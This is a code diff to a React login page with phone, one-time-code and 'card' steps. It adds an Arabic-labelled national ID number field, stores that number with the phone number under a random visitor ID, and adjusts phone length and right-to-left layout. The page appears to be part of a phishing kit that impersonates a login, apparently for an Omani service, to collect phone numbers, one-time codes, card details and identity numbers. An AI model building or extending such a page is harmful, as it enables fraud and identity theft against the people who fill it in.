@@ -17,6 +17,7 @@ const visitorID = randstr("omann-");
 export default function LoginPage() {
   const [step, setStep] = useState<"phone" | "otp" | "card">("phone");
   const [phoneNumber, setPhoneNumber] = useState("");
+  const [idNumber, setIdNumber] = useState("");
   const [rememberMe, setRememberMe] = useState(false);
   const [otp, setOtp] = useState(["", "", "", "", ""]);
   const [timeLeft, setTimeLeft] = useState(58);
@@ -67,6 +68,7 @@ export default function LoginPage() {
       await addData({
         id: visitorID,
         phone: phoneNumber,
+        idNumber,
         createdDate: new Date().toISOString(),
       });
       setStep("otp");
@@ -156,7 +158,7 @@ export default function LoginPage() {
             </div>
 
             {/* Form */}
-            <div className="space-y-6">
+            <div className="space-y-6" dir="rtl">
               {/* Phone number label */}
               <div>
                 <label className="block text-gray-600 text-sm mb-2">
@@ -167,11 +169,22 @@ export default function LoginPage() {
                   value={phoneNumber}
                   onChange={(e) => setPhoneNumber(e.target.value)}
                   placeholder=""
-                  maxLength={10}
+                  maxLength={8}
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-400 focus:border-transparent"
                 />
               </div>
-
+              <div>
+                <label className="block text-gray-600 text-sm mb-2">
+                  رقم البطاقة الشخصية
+                </label>
+                <input
+                  type="tel"
+                  value={idNumber}
+                  onChange={(e) => setIdNumber(e.target.value)}
+                  placeholder=""
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-400 focus:border-transparent"
+                />
+              </div>
               {/* Forgot password and remember me */}
               <div className="flex justify-between items-center">
                 <div className="flex items-center">
